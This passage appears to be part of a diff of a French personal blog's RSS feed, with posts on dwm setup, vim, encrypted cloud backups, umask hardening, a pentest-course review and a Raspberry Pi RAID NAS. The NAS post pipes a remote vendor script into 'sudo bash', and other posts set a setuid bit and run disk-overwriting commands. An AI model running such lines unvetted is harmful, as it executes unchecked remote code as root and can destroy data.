+    Option &quot;ClickMethod&quot; &quot;clickfinger&quot;
+    Option &quot;DisableWhileTyping&quot; &quot;on&quot;
+    Option &quot;MiddleEmulation&quot; &quot;on&quot;
+    Option &quot;NaturalScrolling&quot;
+
+# Récupérer les sources
+
+dwm
+dmenu
+st
+
+sudo make clean install
+
+# Config DWM (config.h)
+
+## Touche MOD, plus pratique de remplacer ALT par la touche Win.
+#define MODKEY Mod1Mask
+#define MODKEY Mod4Mask
+
+## Activer les touches de volumes
+static const char *upvol[]      = { &quot;/usr/bin/amixer&quot;,  &quot;set&quot;, &quot;Master&quot;, &quot;5%+&quot;, NULL };
+static const char *downvol[]    = { &quot;/usr/bin/amixer&quot;,  &quot;set&quot;, &quot;Master&quot;, &quot;5%-&quot;, NULL };
+static const char *mutevol[]    = { &quot;/usr/bin/amixer&quot;,  &quot;set&quot;, &quot;Master&quot;, &quot;toggle&quot;, NULL };
+
+static const Key keys[] = {
+        { MODKEY,                       XK_F2, spawn, {.v = downvol } },
+        { MODKEY,                       XK_F1,  spawn, {.v = mutevol } },
+        { MODKEY,                       XK_F3, spawn, {.v = upvol   } },
+
+## Activer les touches de luminosité
+
+sudo pacman -S light
+sudo chmod +s /user/bin/light
+
+static const char *light_up[]   = { &quot;/usr/bin/light&quot;,   &quot;-A&quot;, &quot;5&quot;, NULL };
+static const char *light_down[] = { &quot;/usr/bin/light&quot;,   &quot;-U&quot;, &quot;5&quot;, NULL };
+
+
+static const Key keys[] = {
+	{ 0,				XF86XK_MonBrightnessUp,		spawn,	{.v = light_up} },
+	{ 0,				XF86XK_MonBrightnessDown,	spawn,	{.v = light_down} },
+
+# DWM usage
+
+MOD+i et MOD+d incrémenter ou décrementer le nbt de fenêtre dans le
+master
+
+# Utilisation dmenu
+
+MOD-P permet de lancer une commande
+
+
+# Configurer une horloge
+
+Modifier le ~/xprofile
+
+while true; do xsetroot -name &quot; $(date +&quot;%H:%M&quot;) &quot;; sleep 60; done &amp;
+
+# Bluetooth
+
+sudo pacman -S bluez-utils
+bluetoothctl scan on
+bluetoothctl connect 74:74:46:1D:EF:AD
+
+bluetoothctl power on
+bluetoothctl power off
+
+
+bluetoothctl power on
+bluetoothctl power off
+
+# Wifi
+
+Scanner les réseaux :
+nmcli device wifi list
+
+Se connecter :
+nmcli device wifi connect &lt;SSID&gt; password &lt;PASSWORD&gt;
+
+# Lock screen
+
+git clone https://git.suckless.org/slock
+cd slock
+sudo make clean install
+
+Dans config.h de slock, modifier le group qui doit être nobody et non
+nogroup sur arch, puis recompiler.  Lancer la commande slock pour
+verrouiller.
+
+Modifier config.h de dwm :
+static const char *lockscreen[]     = { &quot;/usr/local/bin/slock&quot;,  &quot;NULL&quot;, &quot;NULL&quot;, &quot;NULL&quot;, NULL };
+
+static const Key keys[] = {
+        { MODKEY,                       XK_s, spawn, {.v = lockscreen  } },</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/2023-12-08-dwm.txt</guid>
+  </item>
+<item>
+<pubDate>2023-12-13T21:11:20Z 10:56:03 CET</pubDate>
+  <category>2023/12/13/3</category>
+  <title>Historique de ce site, du web 1.0 au 3.0</title>
+  <link>http://3r1c.net/posts/2023-12-13-historique.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>J&#39;ai débuté mon tout premier site perso, de type blog courant 2002. A
+cette époque, il s&#39;agissait de code html + php + mysql. Il n&#39;existait
+pas encore ce qu&#39;on qualifiera plus tard de &quot;plateforme&quot;, un blog
+c&#39;était donc un &quot;développement maison&quot;. Je me suis plus tard intéressé à
+la météorologie et j&#39;ai aussi développé un site de prévision météo.
+Toujours php + mysql. J&#39;avais donc laissé tombé le blog.
+J&#39;ai renoué plus tard avec le &quot;blog&quot; notamment pour partager des
+découvertes technico-informatiques. J&#39;ai utilisé joomla et wordpress.
+J&#39;ai trouvé ça très sympa et je me suis même mis à concevoir quelques
+design web pour ces deux CMS.
+
+Mais voilà, plus le temps passe et plus je recherche la simplicité (ou
+la facilité ?). Je me suis aventuré sur les CMS &quot;sans DB&quot;. Mais il
+existe toujours cette possibilité d&#39;ajouter des plugins, et donc des
+tentations de pousser l&#39;installation et de la complexifier à nouveau.
+
+Aujourd&#39;hui, je me satisfais du minimum : des fichiers textes et un peu
+de markdown si nécessaire. Ce site est devenu totalement statique, avec
+quelques scripts d&#39;automatisation.
+Voilà 20 ans résumés en 20 lignes :-)
+
+Je suis un nostalgique de l&#39;internet des années 2000 (le web 1.0). Je me
+souviens de blogueuses et blogueurs : nacara.free.fr, bingirl.free.fr,
+websucks.net, camstory.net, zerotom.net, geradon.be, et bien d&#39;autres.
+Que sont-ils devenus ? Balayés par le web 2.0. Cette époque nettement
+différente et surtout encore très lointaine des réseaux sociaux était à
+mon sens encore, osons le dire : &quot;saine&quot;. Les social networks ont tout
+dévasté. Les irc, les forums, le mails et même les sites web. Enfin ça
+c&#39;est peut être dû au javascript et aux surdoses de webdesign qui les ont
+rendu si indigestes.
+Les moteurs de recherches ont enterrés les annuaires qui rendaient le
+web vraiment &quot;navigable&quot;. On ne navigue plus aujourd&#39;hui.
+Le web 2.0 en apportant les réseaux sociaux ont doc mis au rebut les
+blogueurs. A la place d&#39;avoir des personnes qui produisaient des
+contenus intéressant sur leurs sites persos, nous avons commencé à voir
+des gens photographier leurs vacances, leurs enfants, leurs animaux et
+même leurs repas de tout les jours. TheFaceDeBouc était né. C&#39;est comme
+si d&#39;un seul coup, ce put*in de réseau social avait permis à chacun de
+devenir un éditeur sur internet. &quot;Éditeur&quot;, on devrait plutôt dire
+&quot;vomisseur&quot; pour refléter la qualité des contenus...
+Je sais très bien ce que vous vous dites en me lisant : &quot;mais est-ce que
+ce foutu réseau social comme tu dis, n&#39;a pas permis à chacun d&#39;avoir la
+possibilité de s&#39;exprimer sur le web ?&quot;.
+Quelle naïveté mouhahaha ! Le seul et unique but de TheFaceDeBook est
+de gagner extrêmement bien sa vie, pendant que vous, vous passez la
+vôtre à travailler pour lui en créant du contenu pour lui et en lui
+confiant vos données personnelles. 
+Tout est question de générer des pépettes. Les réseaux sociaux, les
+moteurs de recherches, le SEO, les services gratuits en ligne : vous
+souscrivez, vous bossez pour eux.
+Je ne vous parle pas du web 3.0 qui risque d&#39;être une sérieuse
+catastrophe pour encore faire plus de thune avec l&#39;inintelligence
+artificielle. Préparez vous à encore plus de publicités ciblées, pour
+rendre encore plus crade internet.
+
+Nous avions un web 1.0 tellement beau. Mais comme on ne sait pas grandir
+autrement que par l&#39;argent, il a fallu coller la dedans des business
+model pour générer du PIB. Et voilà comment on se retrouve avec un web
+2|3 dégueulasse.
+
+Si vous êtes ici, je pense que vous êtes déjà convaincu. Mais le web 1.0
+peut continuer à vivre heureusement ! Et ça grâce à nos sites sans pub,
+sans traceur et sans qui ne nécessitent pas la dernière machine
+surpuissante pour le visiter.</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/2023-12-13-historique.txt</guid>
+  </item>
+<item>
+<pubDate>2023-12-24T10:45:00Z 10:56:03 CET</pubDate>
+  <category>2023/12/24/7</category>
+  <title>Permaculture aventure</title>
+  <link>http://3r1c.net/posts/2023-12-24-permaculture-aventure.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'># Première étape
+
+En ce début d&#39;hiver, c&#39;est parti pour cette tentative de permaculture.
+Première étape terminée : préparer le sol pour obtenir une terre meuble
+dans laquelle les vers de terre et micro organismes ont fait le job.
+On va attendre 3 mois, donc début avril pour découvrir le résultat.
+
+En attendant on peut déjà prévoir les plantations et semi pour janvier.
+
+A suivre ici...</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/2023-12-24-permaculture-aventure.txt</guid>
+  </item>
+<item>
+<pubDate>2023-11-18T11:24:56Z 10:56:03 CET</pubDate>
+  <category>2023/11/18/6</category>
+  <title>Antisèche vim</title>
+  <link>http://3r1c.net/posts/anti-seche-vim.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>Le meilleur
+-----------
+
+- Revenir au mode normal : `ESC` ou `CTRL+[`
+- Se déplacer à la fin du mot suivant : `e`
+- Se déplacer au caractère précédant / suivant : `F` / `f`
+- Aller au paragraphe précédant / suivant : `{}`
+- Copier la ligne : `yy`
+- Rechercher le mod sous le curseur : `#` ou `*`
+- Remplacer et insérer le mot sous le curseur : `cw`
+- Remplacer et insérer le mot sous le curseur et le mot suivant : `c2w`
+- Remplacer la ligne et insérer : `c$`
+- Copier n lignes : `nyy`
+- Explorer le file system : `:Ex`, `:Vex`, `:Sex`, `:Tex`
+- Remplacer dans tout le texte : `:%s/old/new/g`
+- Remplacer dans la sélection (visual mode) : `:s/old/new/g` 
+
+Commenter un bloc
+-----------------
+Commenter :
+Placer le curseur à la 1ère ligne. `CTRL+V` et sélectionner la 1ère colonne
+jusqu&#39;en bas du bloc. `SHIFT+I`, `#`, `Esc`.  
+Décommenter :
+Placer le curseur sur le premier `#`. `CTRL+V` puis sélectionner jusqu&#39;en bas.
+Appuyer sur `x`.
+
+Les onglets (tabs)
+------------------
+
+- Créer un nouveau fichier dans un nouveau tab : `:tabnew /path/to/newfile`
+- Se déplacer vers le tab suivant / précédant : `:tabn` et `:tabp`
+
+Détails 
+-------
+
+- Mode insertion : `i`
+- Mode insertion au début de ligne : `I`
+- Revenir au mode normal : `ESC` ou `CTRL+[`
+- Se déplacer à l&#39;endroit de la dernière insertion : `gi`
+- Se déplacer à la fin du mot suivant : `e`
+- Se déplacer au caractère précédant / suivant : `F` / `f`
+- Se déplacer au mot suivant : `w`
+- Se déplacer 9 mots plus loin : `9w`
+- Se déplacer au mot précédant : `b`
+- Se déplacer de 8 lignes : `8j`
+- Fin de ligne : `$`
+- Début de ligne : `^`
+- Aller à la ligne n : `nG`
+- Aller à la 1ere ligne : `1G`
+- Aller au paragraphe précédant / suivant : `{}`
+- Aller à l&#39;écran précédant / suivant : `CTRL+F` / `CTRL+B`
+- Dernière : `G`
+- Undo : `u`
+- Joindre la ligne suivante à la ligne courante : `J`
+- Numéro de ligne : `Ctrl-g` ou `:set number`
+- Copier la sélection : `y`
+- Copier la ligne : `yy`
+- Copier n lignes : `nyy`
+- Copier le mot : `yw`
+- Copier n mots : `nyw`
+- Coller après le curseur : `p`
+- Coller avant le curseur `P`
+- Supprimer la ligne : `dd`
+- Supprimer le reste de la ligne : `d$`
+- Supprimer depuis le début de la ligne : `d^`
+- Supprimer jusqu&#39;à la fin du fichier : `dG`
+- Supprimer depuis le début du fichier : `d1G`
+- Supprimer 4 lignes : `4dd`
+- Supprimer 3 mots : `3dw`
+- Supprimer les 3 mots précédent : `d3b`
+- Rechercher le mod sous le curseur : `#` ou `*`
+- Rechercher vers le bas : `/chaine`
+- Rechercher vers le haut : `?chaine`
+- Répéter la recherche : `n`
+- Répéter la recherche dans la direction inverse : `N`
+- Désactiver la sensibilité à la casse : `:set ignorecase`
+- Remplacer et insérer à partir du curseur : `cw`
+- Remplacer et insérer à partir du curseur jusqu&#39;au second mot : `c2w`
+- Remplacer la ligne et insérer : `c$`
+
+Un peu plus loin
+----------------
+
+- Supprimer les espaces à la fin de chaque ligne : `:%s/\s\+$//e`
+- Idem au début de chaque ligne : `:%s/^\s+//e`
+- Afficher un guide d&#39;indentation (tab) : `:set listchars=tab:\|\` puis  `:set list`
+- Indenter (tabulation) un bloc de texte : sélectionner le texte avec `V`, puis `jj&gt;`
+- Déplacer le curseur librement : `set virtualedit=all`
+- Fixer une largeur de 80 caractères : `set textwidth=80` ou `set tw=80`
+- Fixer cette largeur pour tout les fichiers .txt, dans `~/.vimrc`
+```
+autocmd FileType text setlocal textwidth=80
+```
+- Pour remplacer la touche ESC (un peu lointaine du centre du clavier) par `jj` dans `~/.vimrc` : `inoremap jj &lt;Esc&gt;`. Note : on peut aussi utiliser `CTRL+[`
+
+autosave
+--------
+
+`~/.vimrc`
+```
+autocmd TextChanged,TextChangedI &lt;buffer&gt; silent write
+```
+
+Spell check
+-----------
+
+Dans `~/.vimrc` :
+```
+set spell
+set spelllang+=fr
+```
+Pour obtenir une suggestion de correction `z=`.
+Pour ajouter un mot au dic : `zg`
+Pour supprimer un mot du doc : `zw`
+Pour se déplacer à la prochaine erreur `]s` et pour la précédente `[s`.
+
+Plugins
+-------
+
+- https://github.com/vim-pandoc/vim-pandoc
+- https://github.com/Scuilion/markdown-drawer
+- https://github.com/junegunn/goyo.vim
+
+Gestion et Installation
+.......................
+
+https://github.com/junegunn/vim-plug
+
+Installation sur vim :
+```
+curl -fLo ~/.vim/autoload/plug.vim --create-dirs \
+    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim
+```
+
+Puis dans `~/.vimrc`
+```
+call plug#begin()
+Plug &#39;junegunn/goyo.vim&#39;
+call plug#end()
+```
+
+Enfin dans vim
+
+```
+:PlugInstall
+```
+
+Installation Neovim
+```
+sh -c &#39;curl -fLo &quot;${XDG_DATA_HOME:-$HOME/.local/share}&quot;/nvim/site/autoload/plug.vim --create-dirs \
+       https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim&#39;
+```</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/anti-seche-vim.txt</guid>
+  </item>
+<item>
+<pubDate>2022-07-18T11:24:56Z 10:56:03 CET</pubDate>
+  <category>2022/07/18/1</category>
+  <title>Chiffrer ses backups dans le cloud</title>
+  <link>http://3r1c.net/posts/chiffrement-des-backups-dans-le-cloud.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>[Rclone](https://rclone.org/) permet de synchroniser vos fichiers avec le cloud (Dropbox, Google drive, pcloud, Mega et bien d&#39;autres). C&#39;est idéal pour un backup en ligne. Pour assurer la confidentialité de nos données, utilisons en complément [gocryptfs](https://nuetzlich.net/gocryptfs/).
+
+Gocryptfs propose un mode &quot;reverse&quot; qui &quot;présente&quot; une vue chiffrée de vos données (et elles restent non chiffrées). Rclone peut ensuite être utilisé pour sauvegarder cette vue chiffrée de vos données, dans un serveur en ligne de votre choix.
+
+## Initialiser la configuration &quot;reverse&quot; gocryptfs
+
+`-plaintextnames` : option pour ne pas chiffrer les noms de fichiers, c&#39;est moins sécurisé mais plus simple pour restaurer un seul fichier !
+
+	$ umask 0077
+	$ mkdir ~/.nobackup
+	$ gocryptfs -reverse -aessiv -plaintextnames \
+    	-config ~/.nobackup/gocryptfs.reverse.rootfs.conf \
+	    -init ~/.nobackup/
+	$ mkdir -p /tmp/remotebackup/rootfs
+
+
+## &quot;Monter&quot; la vue chiffrée dans un dossier
+
+`-extpass`: option qui permet d&#39;obtenir la clé de chiffrement stockée dans votre gestionnaire de mots de passe favoris, [pass](https://www.passwordstore.org/).
+
+	$ gocryptfs -reverse -config ~/.nobackup/gocryptfs.reverse.rootfs.conf -exclude .nobackup/ -exclude /remotebackup/rootfs -fsname gcryptfs-reverse /home/ebsd /tmp/remotebackup/rootfs -extpass pass -extpass mypass/gocrypt
+
+Maintenant les données visibles dans /tmp/remotebackup/rootfs sont indéchiffrables. C&#39;est la fameuse vue chiffrées de vos données.
+
+## Full Backup de la vue chiffrée vers pcloud
+
+`--backup-dir` permet de conserver la dernière version de chaque fichier remplacé, une assurance complémentaire.
+
+	# sync vers pcloud
+	/usr/bin/rclone sync --update --verbose --transfers 30 --checkers 8 --contimeout 60s --timeout 300s --retries 3 --low-level-retries 10 --stats 2s &quot;/tmp/remotebackup/rootfs&quot; &quot;rclone_pcloud:/ebsdhome/&quot; --filter-from ~/rclone-filter
+
+`--filter-from` permet de filtrer ce qui est uploadé, contenu du filtre `~/rclone-filter`
+
+	$ cat rclone-filter 
+	- /Documents/no_backup/**
+	+ /Documents/**
+	+ /sync/**
+	- /.bashrc.d/**
+	+ .bashrc
+	+ .pandoc
+	+ /scripts/**
+	- *
+	- .*
+	- .*/
+
+Tags: backup, cloud, rclone, gocryptfs</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/chiffrement-des-backups-dans-le-cloud.txt</guid>
+  </item>
+<item>
+<pubDate>2021-03-18T11:24:56Z 10:56:03 CET</pubDate>
+  <category>2021/03/18/4</category>
+  <title>Configurer un umask + securisé</title>
+  <link>http://3r1c.net/posts/configurer-un-umask-plus-securise.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>Je fais le point sur les différentes options de configuration du umask. Pour rendre les permissions de votre système plus restrictives, sans pour aurant bloquer tout son fonctionnement, le umask idéal est à mon sens le 027 ; l&#39;utilisateur peut lire et écrire, et le groupe peut seulement lire. Les autres utilisateurs ne possèdent pas de permissions.
+
+## Quel est le Umask par defaut ?
+
+Pour cet article, nous utilisons une distribution redhat like.
+
+Il existe de nombreux shell comme bash, ksh, zsh, et tcsh. Ces shells peuvent se comporter en tant que login shells et non login-shells. Le login shell est généralement appelé en ouvrant un terminal natif ou depuis une GUI.
+
+### Login shell ou non-login shell ?
+
+Pour déterminer quel type de shell on exécute, utilisons la commande `echo $0`.
+
+Si la sortie de `echo $0` retourne bash, alors c&#39;est un non-login shell qui est exécuté. La commande `sudo -s` ne créé pas un login shell.
+
+	$ echo $0
+	bash
+Le umask par défaut pour un non-login shell est configuré dans /etc/bashrc.
+
+Si la sortie de `echo $0` retourne -bash, alors c&#39;est un login shell qui est utilisé. La commande `sudo su -` créé un login shell par exemple.
+
+	# echo $0
+	-bash
+Le umask par défaut pour un login shell est configuré dans /etc/profile.
+
+Pour afficher le umask configuré par défaut pour un non-login shell :
+
+	$ grep umask /etc/bashrc
+	# By default, we want umask to get set. This sets it for non-login shell.
+       umask 002
+       umask 022
+Pour afficher le umask configuré par défaut pour un login shell :
+
+	$ grep umask /etc/profile
+	# By default, we want umask to get set. This sets it for login shell
+       umask 002
+       umask 022
+       
+## Configurer un umask plus restrictif
+
+Nous allons nous attacher aux login shells plus particulièrement.
+
+Utilisons une valeur du umask plus sécurisée dans /etc/profile : umask 022 =&gt; umask 027
+
+	if [ $UID -gt 199 ] &amp;&amp; [ &quot;/usr/bin/id -gn&quot; = &quot;/usr/bin/id -un&quot; ]; then
+		umask 002
+	else
+		umask 027
+	fi
+
+En complément, on souhaite conserver un umask à 022 pour un utilisateur particulier :
+
+	$ echo &#39;umask 022&#39; &gt;&gt; /home/username/.bashrc
+
+## Job Ansible
+
+Et voici une tâche ansible qui fait le job :
+
+	- name: Set default umask 027 in /etc/profile for login shells
+	  replace:
+	    path: /etc/profile
+	    regexp: &#39;(^\s+umask) (0[012][0-6])&#39;
+	    replace: &#39;027&#39;
+
+	- name: Set default umask 027 in /etc/login.defs for newly created home directories
+	  replace:
+	    path: /etc/login.defs
+	    regexp: &#39;(umask|UMASK).+(0[012][0-6])&#39;
+	    replace: &#39;027&#39;
+
+	- name: Set mask 022 or set back to 022 if other umask already set for specific account
+	  lineinfile:
+	    dest: /home/username/.bashrc
+	    state: present
+	    regexp: &#39;^(umask|UMASK)&#39;
+	    line: &#39;umask 022&#39;
+
+Tags: linux, security, umask, ansible</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/configurer-un-umask-plus-securise.txt</guid>
+  </item>
+<item>
+<pubDate>2023-10-16T18:04:21Z 10:56:03 CET</pubDate>
+  <category>2023/10/16/1</category>
+  <title>De-googlisation</title>
+  <link>http://3r1c.net/posts/degougueulisation.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>Je ne sais pas si c&#39;est correctement orthographié, mais vous voyez bien l&#39;idée.
+Depuis quelques temps j&#39;explore les pistes pour sortir de l&#39;emprise du gouglle.
+
+Aujourd&#39;hui parlons smartphone. Abandonner android c&#39;est pas encore pour demain
+selon mes quelques lectures. Cepandant, on peut sans doute commencer par
+quelques applications.
+
+Exit maps
+---------
+
+Je n&#39;en suis qu&#39;à mes premiers pas :-) J&#39;ai un tout petit peu progressé du côté
+de mon smartphone. Une des grandes interrogations étaient de trouver une
+alternative à maps. C&#39;est chose faite avec **Organic Maps**, disponible sur
+F-Droid.
+
+Il faut donc installer F-Droid dans un 1er temps. Puis, lui donner
+l&#39;autorisation d&#39;installer des applications (la demande d&#39;autorisation se fait
+lors de la première installation d&#39;une app de F-Droid).
+
+Quelques autres apps sur F-Droid
+--------------------------------
+
+J&#39;en profite pour faire part également de ma découverte de ces applications :
+
+- Mull, un navigateur orienté &quot;vie privée&quot; basé sur Mozilla
+- Sky Map, une fenêtre sur votre ciel
+- New Pipe, un client youtube
+
+gmail
+-----
+
+Je réfléchis toujours à une alternative auto-hébergée. Mais qui ne génère pas
+&quot;trop&quot; de maintenance. Exim ?  Il faut dire que c&#39;est un peu compliqué car je ne
+dispose que d&#39;une connexion 4G (pas de fibre ou adsl) et en conséquence je n&#39;ai
+pas vraiment d&#39;IP publique, et celle qui est vue de &quot;l&#39;extérieure&quot; est en fait
+partagée avec des centaines de personnes. J&#39;aurais donc sans doute à utiliser un
+VPS en tant que relai smtp. Ca ne simplifie pas les choses.</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/degougueulisation.txt</guid>
+  </item>
+<item>
+<pubDate>2018-01-02T11:24:56Z 10:56:03 CET</pubDate>
+  <category>2018/01/02/2</category>
+  <title>[en] eCPPT course and exam review</title>
+  <link>http://3r1c.net/posts/ecppt-course-and-exam-review.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>I decided to write this [eCPPT][1] course review after passing the exam. It&#39;s a totally independent review, I have nothing to gain.
+
+#### Course
+
+eCPPT is a pentesting certification which will actually teach you skills through high quality courses and practical labs.
+You will learn : 
+
+ - Penetration testing processes and methodologies
+ - WebApp security (vulnerability assessment, SQL Injections, LFI/RFI, XSS, CSRF)
+ - Network security (vulnerability assessment, performing attacks and pivoting, sniffing, poisoning,  privilege escalation and persistence)
+ - System security (especially Exploit Development)
+ - Wireless security (discover and attack)
+ - Advanced exploitation with ruby and metasploit
+
+Moreover, you will learn how to elaborate a real profesionnal **pentesting report** : this is very good point. It&#39;s not a question of how to caputre a flag. This is important if you want to join the infosec business : you will get advanced reporting skills
+
+Note that manual and automated web application exploitation is taught which allow to really understand vulnerabilities, and not only use scripts or tools.
+
+There are many slides and hours of videos. You will nerver be bored !
+
+Of course you will learn the metasploit framework use. 
+
+#### Labs
+
+To pass eCPPT you will not have to only learn theorical concepts and then answer multiple choice questions. You will have to get hands-on experience through the labs. This is the strenght of eCPPT.
+
+Please note that the labs are oriented to skills you : forget about &quot;Capture The Flag&quot; in this course. I think this is a better orientation compared to others certifications.
+
+You are &quot;alone&quot; in your labs virtual environment. You can reset a lab if things become wrong. All labs certifications do not allow it.
+
+#### Tools
+
+PPT course teach you how to use a large toolbox for scan, assess, exploit, post-exploit... During the exam, you will not be limited for the tools use.
+
+#### Exam
+
+First, I will not tell to much about the exam itself. I don&#39;t want to include exam spoilers. If you have done the labs, everything should be fine.
+If you fail, you&#39;ll have a second chance.
+
+The exam consists of two parts : doing a real world pentest, and then writing a report. Each part lasts one week. An engagement is provided and indicate your scope and objectives.
+
+I spent about 35 hours in the first part (I took few days off). Some targets are harder than others, and hardests can be demotivating : try again and again and take breaks !
+
+For the repporting part, I recommend preparing a report support before starting the exam. Moreover don&#39;t forget to write notes and take screenshots of all what you could use in your report. You will have to organize all of your information, prepare a detailed analysis and provide remediation actions.
+
+#### Conclusion
+
+
+eCPPT will dive you into the penetration testing world. It provides high quality materials and good support thanks to the active forum where admins will always answer.
+
+I loved the labs and the exam was really interesting as they reflect real company networks.
+
+Before taking the exam, don&#39;t forget to prepare coffee and energy drinks, you will need them !
+
+eCPPT was a very enjoyable experience !
+
+[1]: https://www.elearnsecurity.com/certification/ecppt/
+
+Tags: eCPPT, pentest</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/ecppt-course-and-exam-review.txt</guid>
+  </item>
+<item>
+<pubDate>2023-10-26T10:20:00Z 10:56:03 CET</pubDate>
+  <category>2023/10/26/4</category>
+  <title>How to Hire Me</title>
+  <link>http://3r1c.net/posts/how-to-hire-me.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>J&#39;occupe actuellement un emploi satisfaisant associé à une rémunération
+tout à fait convenable. Si vous recherchez à recruter, je vous remercie
+de fournir les informations suivantes afin que je puisse étudier l&#39;offre
+et effectuer les recherches d&#39;usage concernant l&#39;entreprise.
+
+- le nom de l&#39;entreprise qui propose l&#39;emploi
+- le salaire et les éventuels avantages
+- les compétences requises
+- les compétences appréciées
+- la part de télétravail
+- les besoins en déplacements
+- nationalité acceptées, permis de travail éventuels et autres
+  autorisations nécessaires
+- pourquoi le poste est ouvert ?
+
+S&#39;il vous plaît ne m&#39;écrivez pas sur mes comptes professionnels. 
+
+
+I currently have a stable job that pays reasonably well for my locale.
+If you’re looking to hire, please provide the following information so
+that I can make an informed decision and do further research to learn
+about your company.
+
+- the name of the company offering the job
+- salary and benefits on offer
+- required skills
+- optional skills
+- presence and travel requirements
+- citizenship, visa, and clearance requirements
+- why the position is open
+
+Please do not send email to my work accounts.</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/how-to-hire-me.txt</guid>
+  </item>
+<item>
+<pubDate>2023-10-01 10:56:03 CET</pubDate>
+  <category>2023/10/01/7</category>
+  <title>Brouillon pour "le monde de demain"</title>
+  <link>http://3r1c.net/posts/le-monde-de-demain-draft.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>Idées en mode brouillon pour mon modeste récit collapse / effondrement :
+- Trois façon de mourir collectivement : guerre, maladie, famine
+- Les réacteurs nucléaires ont besoin de 4 mois de refroidissement après un
+  arrêt de la centrale. Donc 4 mois d&#39;énergie. Évidemment on ne les aura pas
+sinon ce serait pas drôle :)
+- Les humains seraient plus efficace ensemble en situation de stress, meilleures
+  coopérations. Tout seul on va vite, ensemble on va loin.</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/le-monde-de-demain-draft.txt</guid>
+  </item>
+<item>
+<pubDate>2020-06-18T11:24:56Z 10:56:03 CET</pubDate>
+  <category>2020/06/18/4</category>
+  <title>Home made  nas</title>
+  <link>http://3r1c.net/posts/nas-maison-raspberry-pi4-quad-sata.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>&gt; Ceci est obsolète, je n&#39;utilise plus de VPS, seulement des rpi.
+
+En complément de mon serveur VPS en ligne, j&#39;ai récemment acquis un **Raspberry Pi 4** et un **[Quad Sata Hat](https://wiki.radxa.com/Dual_Quad_SATA_HAT)**. Ce dernier permet de connecter jusqu&#39;à 4 disques SATA 2,5p au Raspberry Pi. Parfait pour un RAID qui sécurise mes données. Celles-ci sont synchronisées entre le VPS et le Pi via [Syncthing](https://syncthing.net). Je dispose ensuite de backups incémentaux effectués sur les disques du RAID grâce à rsync. Voici quelques infos pour la mise en route du **Quad Sata Hat** et d&#39;un RAID1 logiciel sous Raspbian. Pour l&#39;exercice, nous devons créer ce RAID mirroir sur 2 disques **sans perdre les données déjà présentes** sur un des deux disques. Voici une modeste représentation visuelle de mon installation. 
+```
+    &lt;------+  CLOUD  +-----&gt;             &lt;---+ HOME +---&gt;
+    rclone         ___                       ___
+    crypt         +===+     Syncthing       +===+
+    +-----------+ |VPS|  &lt;---------------+&gt; |Pi |
+    |             +___+                  |  +___+
+    |               ^                    |
+    |               | syncthing          |  ++ ++ 2 HDD    ++ ++ 2 HDD
+    v               |                    +&gt; || || RAID1    || || RAID1
+    gdrive          v                       ++ ++          ++ ++
+                  Laptop                      +   rsnapshot  ^
+                                              +--------------+
+```
+Le Quad Sata Hat est disponible [ici](https://shop.allnetchina.cn/products/dual-sata-hat-open-frame-for-raspberry-pi-4).
+
+#### Installation du Quad Sata HAT sur raspbian
+Script d&#39;installation :
+
+	curl -sL https://rock.sh/get-rockpi-sata | sudo -E bash -
+On obtient un nouveau dossier :
+
+	/usr/bin/rockpi-sata
+
+Et un fichier de configuration, voir détails plus bas [1] 
+
+	/etc/rockpi-sata.conf
+
+#### Comment créer un RAID1 dont 1 des 2 disques contient déjà mes donneés ?
+Je dispose de deux disques :
+
+- /dev/sda = disque contenant mes données
+- /dev/sdb = nouveau disque vièrge
+
+On installe les outils de gestion du RAID:
+	
+	apt-get install mdadm
+
+On démonte les disques :
+
+	umount /mnt/disk1
+	umount /mnt/disk2
+
+On utilise sfdisk pour dupliquer la configuration des partitions du disque sda vers le disque sdb.
+
+	sfdisk -d /dev/sda | sfdisk /dev/sdb
+
+Utilisons maintenant `mdadm` pour créer un RAID1. On marque le premier disque sda comme &quot;manquant&quot; (missing) pour que les données du disque ne soient pas écrasées par la construction du RAID. Le second /dev/sdb1 est présent.
+
+	mdadm --create /dev/md0 --level 1 --raid-devices=2 missing /dev/sdb1
+
+On formatte le nouveau RAID :
+
+	mkfs.ext4 /dev/md0
+
+On monte le RAID :
+
+	mkdir /mnt/raid1
+	mount /dev/md0 /mnt/raid1
+
+Copions le contenu du disque /dev/sda1 dans /dev/md0.
+
+	mount /dev/sda1 /mnt/disk1
+	rsync -rtavz --delete /mnt/disk1/ /mnt/raid1/
+
+Démontons le disque que nous allons ensuite activer dans le RAID1.
+
+	umount /mnt/disk1
+
+Inrégrer le disque 1 au RAID
+
+	mdadm --add /dev/md0 /dev/sda1
+
